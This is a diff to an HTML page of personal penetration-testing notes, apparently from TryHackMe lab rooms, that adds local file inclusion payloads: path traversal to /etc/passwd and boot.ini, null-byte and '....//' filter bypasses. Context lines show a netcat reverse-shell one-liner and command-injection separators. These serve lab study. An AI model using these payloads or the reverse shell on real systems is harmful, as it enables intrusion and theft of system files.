@@ -88,6 +88,9 @@
   <ol>Google dork: -site:www.tryhackme.com  site:*.tryhackme.com</ol>
   </div>
               <!--  information gathering section end here    -->
+
+
+
               <!--  Vulnerability Finding section start from here    -->
 
   <br><br><h1 style="text-align: center;text-decoration: underline;">Vulnerability Finding</h1>
@@ -108,7 +111,7 @@
     <h2><li>Local File Inclusion (LFI)</li></h2>
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png">
      <p>If website allow user to execute command in quary string after '=' sign, then this vulnerability happend.<br>Normally this cause happend for file_get_contents PHP fuction.</p>
-
+     <p>If PHP 5.3.4 and down then NULLBYTE (%00 or 0x00) vulnerability will working.</p>
     <h2><li>Remote code execution vulnerability</li></h2>
     <p>If website allow to execute code with their allow code like[their_code;attacker_code] then this vulnerability exist. <br>
     mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>
@@ -118,6 +121,10 @@
     
   </div>
             <!--  Vulnerability Finding section end here    -->
+
+
+
+
               <!--  Exploitation section start from here    -->
   <br><br><h1 style="text-align: center;text-decoration: underline;">Exploitation</h1>
   <div>
@@ -158,7 +165,12 @@ nc -e /bin/sh 10.20.14 8080<br>
 
      <br>if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
      <b>http://webapp.thm/get.php?file=../../../../boot.ini</b> or <b>http://webapp.thm/get.php?file=../../../../windows/win.ini</b>
-  </div>
+     <br><br>
+     <p>if <b>/etc/passwd</b> not work then try, <b>../../../../etc/passwd</b>. If it also didnot work then try, <b>with NULLBYTE(%00, 0x00) at the end of the payload.<br> example: http://webapp.thm/index.php?lang=/etc/passwd%00 or http://webapp.thm/index.php?lang=../../../../etc/passwd%00</b></p>
+     <p> If none of them work then try <b>/etc/passwd/.</b> <br> if all of them are failed then oviously try this one - <b>....//....//....//....//....//etc/passwd</b></p>
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png" alt="">
+     <h4>Tips: some time it only work on url. it also some time word on specified folder. find it and execute payload there.</h4>
+    </div>
    <!-- Exploitation section end here    -->
 </body>
 </html>           
